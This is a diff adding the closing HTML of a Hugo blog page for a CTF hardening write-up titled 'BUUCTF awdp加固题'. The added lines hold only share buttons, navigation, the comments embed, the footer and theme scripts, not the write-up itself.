+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/buuctf_reinforce_wp/" data-title="BUUCTF awdp加固题" data-hashtags="web,awdp"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/buuctf_reinforce_wp/" data-hashtag="web"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/buuctf_reinforce_wp/" data-title="BUUCTF awdp加固题"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/buuctf_reinforce_wp/" data-title="BUUCTF awdp加固题"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/buuctf_reinforce_wp/" data-title="BUUCTF awdp加固题"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/buuctf_reinforce_wp/" data-title="BUUCTF awdp加固题" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;BUUCTF awdp加固题&#34;, &#34;http://scofield1920.github.io/buuctf_reinforce_wp/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/web/">web</a>,&nbsp;<a href="/tags/awdp/">awdp</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/ctfhub--info_leakage/" class="prev" rel="prev" title="ctfhub_信息泄露wp"><i class="fas fa-angle-left fa-fw"></i>ctfhub_信息泄露wp</a>
+            <a href="/git/" class="next" rel="next" title="Git">Git<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.120.4">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
